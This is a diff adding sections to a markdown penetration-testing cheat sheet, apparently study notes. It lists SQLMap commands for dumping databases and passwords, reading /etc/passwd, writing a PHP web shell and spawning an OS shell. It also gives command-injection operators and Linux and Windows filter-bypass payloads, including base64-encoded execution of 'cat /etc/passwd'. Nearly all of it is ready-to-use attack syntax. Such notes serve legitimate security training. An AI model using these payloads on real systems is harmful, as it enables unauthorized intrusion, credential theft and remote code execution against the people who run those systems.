@@ -303,6 +303,162 @@
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
 
+# SQLMap Commands
+
+| Command                                                                 | Description                                           |
+|-------------------------------------------------------------------------|-------------------------------------------------------|
+| `sqlmap -h`                                                             | View the basic help menu                              |
+| `sqlmap -hh`                                                            | View the advanced help menu                           |
+| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`              | Run SQLMap without asking for user input              |
+| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`             | SQLMap with POST request                              |
+| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`            | POST request specifying an injection point with an asterisk |
+| `sqlmap -r req.txt`                                                     | Passing an HTTP request file to SQLMap                |
+| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`      | Specifying a cookie header                            |
+| `sqlmap -u www.target.com --data='id=1' --method PUT`                   | Specifying a PUT request                              |
+| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file                       |
+| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`          | Specify verbosity level                               |
+| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`   | Specifying a prefix or suffix                         |
+| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                        | Specifying the level and risk                         |
+| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration                                  |
+| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`           | Table enumeration                                     |
+| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Table/row enumeration                                 |
+| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration                               |
+| `sqlmap -u "http://www.example.com/?id=1" --schema`                     | Database schema enumeration                           |
+| `sqlmap -u "http://www.example.com/?id=1" --search -T user`             | Searching for data                                    |
+| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`          | Password enumeration and cracking                     |
+| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                |
+| `sqlmap --list-tampers`                                                 | List all tamper scripts                               |
+| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`            | Check for DBA privileges                              |
+| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`    | Reading a local file                                  |
+| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file                                        |
+| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                   | Spawning an OS shell                                  |
+
+# Command Injection 
+
+## Injection Operator
+
+| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                        |
+|--------------------|---------------------|-----------------------|-----------------------------------------|
+| Semicolon          | ;                   | %3b                   | Both                                    |
+| New Line           | \n                  | %0a                   | Both                                    |
+| Background         | &                   | %26                   | Both (second output generally shown first) |
+| Pipe               | \|                  | %7c                   | Both (only second output is shown)      |
+| AND                | &&                  | %26%26                | Both (only if first succeeds)           |
+| OR                 | \|\|                | %7c%7c                | Second (only if first fails)            |
+| Sub-Shell          | ``                  | %60%60                | Both (Linux-only)                       |
+| Sub-Shell          | $()                 | %24%28%29             | Both (Linux-only)                       |
+
+# Linux
+
+## Filtered Character Bypass
+
+| Code                     | Description                                        |
+|--------------------------|----------------------------------------------------|
+| `printenv`               | Can be used to view all environment variables      |
+
+### Spaces
+
+| Code                     | Description                                        |
+|--------------------------|----------------------------------------------------|
+| `%09`                    | Using tabs instead of spaces                       |
+| `${IFS}`                 | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) |
+| `{ls,-la}`               | Commas will be replaced with spaces                |
+
+### Other Characters
+
+| Code                     | Description                                        |
+|--------------------------|----------------------------------------------------|
+| `${PATH:0:1}`            | Will be replaced with /                            |
+| `${LS_COLORS:10:1}`      | Will be replaced with ;                            |
+| `$(tr '!-}' '"-~'<<<[)`  | Shift character by one ([ -> \)                    |
+
+## Blacklisted Command Bypass
+
+### Character Insertion
+
+| Code                     | Description                                        |
+|--------------------------|----------------------------------------------------|
+| `' or "`                 | Total must be even                                 |
+| `$@ or \`                | Linux only                                         |
+
+### Case Manipulation
+
+| Code                                              | Description                                        |
+|---------------------------------------------------|----------------------------------------------------|
+| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                | Execute command regardless of cases                |
+| `$(a="WhOaMi";printf %s "${a,,}")`                | Another variation of the technique                 |
+
+### Reversed Commands
+
+| Code                     | Description                                        |
+|--------------------------|----------------------------------------------------|
+| `echo 'whoami' | rev`    | Reverse a string                                   |
+| `$(rev<<<'imaohw')`      | Execute reversed command                           |
+
+### Encoded Commands
+
+| Code                                                              | Description                                        |
+|-------------------------------------------------------------------|----------------------------------------------------|
+| `echo -n 'cat /etc/passwd | grep 33' | base64`                    | Encode a string with base64                        |
+| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`      | Execute b64 encoded string                         |
+
+# Windows
+
+## Filtered Character Bypass
+
+| Code                     | Description                                        |
+|--------------------------|----------------------------------------------------|
+| `Get-ChildItem Env:`     | Can be used to view all environment variables - (PowerShell) |
+
+### Spaces
+
+| Code                                     | Description                                        |
+|------------------------------------------|----------------------------------------------------|
+| `%09`                                    | Using tabs instead of spaces                       |
+| `%PROGRAMFILES:~10,-5%`                  | Will be replaced with a space - (CMD)              |
+| `$env:PROGRAMFILES[10]`                  | Will be replaced with a space - (PowerShell)       |
+
+### Other Characters
+
+| Code                                     | Description                                        |
+|------------------------------------------|----------------------------------------------------|
+| `%HOMEPATH:~0,-17%`                      | Will be replaced with \ - (CMD)                    |
+| `$env:HOMEPATH[0]`                       | Will be replaced with \ - (PowerShell)             |
+
+## Blacklisted Command Bypass
+
+### Character Insertion
+
+| Code                     | Description                                        |
+|--------------------------|----------------------------------------------------|
+| `' or "`                 | Total must be even                                 |
+| `^`                      | Windows only (CMD)                                 |
+
+### Case Manipulation
+
+| Code                     | Description                                        |
+|--------------------------|----------------------------------------------------|
+| `WhoAmi`                 | Simply send the character with odd cases           |
+
+### Reversed Commands
+
+| Code                                             | Description                                        |
+|--------------------------------------------------|----------------------------------------------------|
+| `"whoami"[-1..-20] -join ''`                     | Reverse a string                                   |
+| `iex "$('imaohw'[-1..-20] -join '')"`            | Execute reversed command                           |
+
+### Encoded Commands
+
+| Code                                                                                            | Description                                        |
+|-------------------------------------------------------------------------------------------------|----------------------------------------------------|
+| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                  | Encode a string with base64                        |
+| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string                         |
+
+
+
+
+
+
 
 
 
